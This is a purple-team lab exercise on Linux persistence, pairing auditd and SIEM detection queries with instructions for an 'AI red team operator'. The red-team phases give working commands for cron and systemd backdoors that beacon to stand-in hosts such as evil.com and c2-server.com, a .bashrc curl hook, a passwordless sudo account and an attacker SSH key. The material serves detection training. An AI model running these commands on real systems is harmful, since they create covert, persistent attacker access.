# Basic Persistence Mechanisms

**Exercise ID**: BEG-002  
**MITRE ATT&CK Tactics**: Persistence (TA0003), Privilege Escalation (TA0004)  
**Difficulty**: 🟢 Beginner  
**Duration**: 2-4 hours  

## Overview & Learning Objectives

This exercise teaches fundamental persistence techniques attackers use to maintain access to systems. Blue teams will learn to identify and respond to common persistence mechanisms across Linux and Windows environments.

**Learning Outcomes:**

- Detect common persistence techniques in system logs
- Understand legitimate vs. malicious scheduled tasks and services
- Build detection rules for persistence-related activities
- Practice incident response for persistence-based threats

**Target MITRE ATT&CK Techniques:**

- T1543.002: Create or Modify System Process - Systemd Service
- T1053.003: Scheduled Task/Job - Cron
- T1546.004: Event Triggered Execution - Unix Shell Configuration Modification
- T1098: Account Manipulation
- T1136: Create Account

## Infrastructure Requirements

- **Minimum Setup**: 1 Linux victim machine
- **Recommended Setup**: 2 machines (1 Linux + 1 Windows victim)
- **Kali Linux**: Available via MCP for AI red team
- **SIEM**: Splunk or qRadar with auditd and syslog forwarding
- **Permissions**: Victim machines should allow privilege escalation for demonstration

## Setup Instructions (for Blue Team)

### Pre-Exercise Configuration

1. **Enable Enhanced Logging**

   ```bash
   # On Linux victim - ensure auditd is running
   sudo systemctl status auditd
   sudo auditctl -l  # List current audit rules
   
   # Add monitoring for key persistence locations
   sudo auditctl -w /etc/crontab -p wa -k cron_persistence
   sudo auditctl -w /etc/systemd/system/ -p wa -k systemd_persistence
   sudo auditctl -w /home/ -p wa -k home_modification
   ```

2. **Baseline Documentation**

   ```bash
   # Document current system state
   ps aux > /tmp/baseline_processes.txt
   systemctl list-units --type=service > /tmp/baseline_services.txt
   crontab -l > /tmp/baseline_crontab.txt 2>/dev/null || echo "No crontab"
   ls -la /etc/systemd/system/ > /tmp/baseline_systemd.txt
   ```

3. **SIEM Preparation**
   - Set up real-time monitoring for file modifications in `/etc/`
   - Create alerting for new service creation
   - Configure monitoring for user account changes

### SIEM Query Examples

**Splunk - Persistence Detection:**

```splunk
index=main (sourcetype=linux_audit OR sourcetype=syslog)
(
    (key=cron_persistence) OR 
    (key=systemd_persistence) OR
    (program=systemctl AND "enable") OR
    (useradd OR userdel OR usermod) OR
    (bash_profile OR bashrc OR profile)
)
| eval persistence_type=case(
    match(_raw,"cron"), "Cron-based",
    match(_raw,"systemd"), "Service-based", 
    match(_raw,"user"), "Account-based",
    match(_raw,"bash"), "Profile-based",
    1=1, "Other"
)
| stats count by host, persistence_type, user
| sort -count
```

**qRadar - Service and Account Monitoring:**

```sql
SELECT 
    sourceip,
    "Log Source",
    "Event Name", 
    payload,
    starttime
FROM events
WHERE 
    (payload ilike '%systemctl enable%' OR
     payload ilike '%crontab%' OR
     payload ilike '%useradd%' OR
     payload ilike '%usermod%' OR
     payload ilike '%bashrc%')
    AND starttime > NOW() - INTERVAL '4 HOURS'
ORDER BY starttime DESC
```

## Red Team AI Instructions

**Context**: You are an AI red team operator with access to a victim machine in the APTL environment. Your goal is to establish persistence through multiple common techniques. Execute these procedures to demonstrate various persistence mechanisms while generating detectable events.

### Phase 1: Cron-based Persistence (T1053.003)

**Objective**: Establish persistence using scheduled tasks.

1. **Check current cron configuration:**

   ```bash
   # Reconnaissance first
   crontab -l
   ls -la /etc/cron*
   cat /etc/crontab
   ```

2. **Create malicious cron job:**

   ```bash
   # Create a simple persistence mechanism
   echo "*/5 * * * * /bin/bash -c 'curl -s http://attacker-c2.com/beacon || echo persistence-check'" | crontab -
   
   # Verify it was added
   crontab -l
   ```

3. **Alternative system-wide cron:**

   ```bash
   # If you have sudo access, add system-wide persistence
   echo "*/10 * * * * root /tmp/persistence_script.sh" | sudo tee -a /etc/crontab
   
   # Create the referenced script
   echo '#!/bin/bash
   echo "$(date): Persistence check" >> /tmp/persistence.log
   curl -s http://evil.com/beacon >/dev/null 2>&1 || true' | sudo tee /tmp/persistence_script.sh
   sudo chmod +x /tmp/persistence_script.sh
   ```

### Phase 2: Systemd Service Persistence (T1543.002)

**Objective**: Create a malicious systemd service for persistence.

1. **Create malicious service file:**

   ```bash
   # Create a fake "system update" service
   sudo tee /etc/systemd/system/system-updater.service <<EOF
   [Unit]
   Description=System Update Service
   After=network.target
   
   [Service]
   Type=forking
   ExecStart=/bin/bash -c 'nohup /tmp/backdoor.sh &'
   Restart=always
   RestartSec=60
   User=root
   
   [Install]
   WantedBy=multi-user.target
   EOF
   ```

2. **Create the backdoor script:**

   ```bash
   # Create the payload script
   sudo tee /tmp/backdoor.sh <<EOF
   #!/bin/bash
   while true; do
       curl -s http://c2-server.com/checkin -d "host=$(hostname)" || true
       sleep 300
   done
   EOF
   sudo chmod +x /tmp/backdoor.sh
   ```

3. **Enable and start the service:**

   ```bash
   # Enable the malicious service
   sudo systemctl daemon-reload
   sudo systemctl enable system-updater.service
   sudo systemctl start system-updater.service
   
   # Verify it's running
   sudo systemctl status system-updater.service
   ```

### Phase 3: Shell Profile Persistence (T1546.004)

**Objective**: Modify shell configuration files for persistence.

1. **Modify user bash profile:**

   ```bash
   # Add persistence to user's bashrc
   echo 'export PATH="/tmp:$PATH"' >> ~/.bashrc
   echo 'curl -s http://evil.com/profile-load >/dev/null 2>&1 &' >> ~/.bashrc
   
   # Alternative: modify bash_profile
   echo 'nohup /tmp/user_persistence.sh >/dev/null 2>&1 &' >> ~/.bash_profile
   ```

2. **Create user persistence script:**

   ```bash
   # Create user-level persistence
   cat > /tmp/user_persistence.sh <<EOF
   #!/bin/bash
   echo "$(date): User profile loaded by $(whoami)" >> /tmp/profile_persistence.log
   curl -s http://attacker.com/user-beacon || true
   EOF
   chmod +x /tmp/user_persistence.sh
   ```

3. **Test profile modifications:**

   ```bash
   # Test the persistence by starting a new shell
   bash -l
   # Check if persistence script ran
   cat /tmp/profile_persistence.log
   ```

### Phase 4: Account-based Persistence (T1098, T1136)

**Objective**: Create backdoor user accounts for persistence.

1. **Create backdoor user:**

   ```bash
   # Create a user with sudo privileges
   sudo useradd -m -s /bin/bash -G sudo backup-service
   echo 'backup-service:SecretPass123!' | sudo chpasswd
   
   # Add to sudoers for persistence
   echo 'backup-service ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers.d/backup-service
   ```

2. **Modify existing account:**

   ```bash
   # Add SSH key to existing user (if applicable)
   mkdir -p ~/.ssh
   echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali' >> ~/.ssh/authorized_keys
   chmod 600 ~/.ssh/authorized_keys
   chmod 700 ~/.ssh
   ```

3. **Test account access:**

   ```bash
   # Switch to the new user to test
   sudo su - backup-service
   whoami
   sudo -l
   exit
   ```

### Expected AI Behavior

- **Document all modifications** made to the system
- **Provide timestamps** for each persistence mechanism created
- **Test persistence** by rebooting or restarting services where possible
- **Summarize** all persistence methods established

## Detection Scenarios

### Scenario 1: Cron Modification Alert

**Expected Timeline**: 10-20 minutes after exercise start
**What Blue Team Should See**: Crontab modifications and new scheduled tasks

**Detection Points:**

- File modifications to `/etc/crontab` or user crontabs
- Process execution of `crontab` command
- Suspicious scheduled task content (URLs, unusual scripts)

### Scenario 2: Service Creation Detection

**Expected Timeline**: 20-35 minutes after exercise start
**What Blue Team Should See**: New systemd service creation and activation

**Detection Points:**

- New files in `/etc/systemd/system/`
- `systemctl enable` and `systemctl start` commands
- Services starting outside normal system startup

### Scenario 3: Profile Modification Alert

**Expected Timeline**: 35-45 minutes after exercise start
**What Blue Team Should See**: Shell configuration file modifications

**Detection Points:**

- Modifications to `.bashrc`, `.bash_profile`, or `/etc/profile`
- Unusual PATH modifications
- Profile-based command execution

### Scenario 4: Account Manipulation Detection

**Expected Timeline**: 45-60 minutes after exercise start
**What Blue Team Should See**: New user creation and privilege modifications

**Detection Points:**

- `useradd` command execution
- Modifications to `/etc/sudoers` or `/etc/sudoers.d/`
- SSH key additions to `authorized_keys`

## Expected Outcomes

### Blue Team Success Metrics

- **Detection Coverage**: Detect at least 75% of persistence attempts
- **Alert Timing**: Trigger alerts within 5 minutes of persistence creation
- **Classification**: Correctly identify persistence technique types

### Common Detection Challenges

- **Legitimate Administration**: Distinguishing between admin tasks and attacks
- **Timing-based Evasion**: Slow persistence establishment over time
- **Privilege Requirements**: Some persistence requires elevated privileges

### Improvement Areas

1. **File Integrity Monitoring**: Better monitoring of critical system files
2. **User Behavior Analytics**: Detecting unusual account activities  
3. **Service Monitoring**: Better visibility into service lifecycle events

## Cleanup & Lessons Learned

### Cleanup Procedures

```bash
# Remove cron persistence
crontab -r
sudo sed -i '/persistence_script.sh/d' /etc/crontab

# Remove systemd service
sudo systemctl stop system-updater.service
sudo systemctl disable system-updater.service
sudo rm /etc/systemd/system/system-updater.service
sudo systemctl daemon-reload

# Clean profile modifications
sed -i '/evil.com/d' ~/.bashrc
sed -i '/user_persistence/d' ~/.bash_profile

# Remove backdoor account
sudo userdel -r backup-service
sudo rm -f /etc/sudoers.d/backup-service

# Remove temporary files
sudo rm -f /tmp/backdoor.sh /tmp/persistence_script.sh /tmp/user_persistence.sh
rm -f /tmp/profile_persistence.log /tmp/persistence.log
```

### Key Discussion Points

- Which persistence techniques were most difficult to detect?
- How can false positives be minimized for legitimate system administration?
- What additional monitoring would improve detection capabilities?
- How do these techniques vary between Linux and Windows environments?

### Follow-up Actions

1. **Detection Rule Enhancement**: Update SIEM rules based on findings
2. **Incident Response**: Practice persistence removal procedures
3. **Prevention**: Implement controls to prevent unauthorized persistence

### Next Exercise Recommendations

- **BEG-003: Basic Credential Access** - Building on established persistence
- **INT-001: Advanced Persistence** - More sophisticated techniques
- **BEG-004: Initial Access Simulation** - Complete attack chain exercise

---

**Exercise Notes:**

- This exercise requires elevated privileges for full demonstration
- Some persistence techniques may require system reboot to fully test
- Consider running on disposable VM instances for easy cleanup
- Excellent foundation for understanding persistence detection challenges
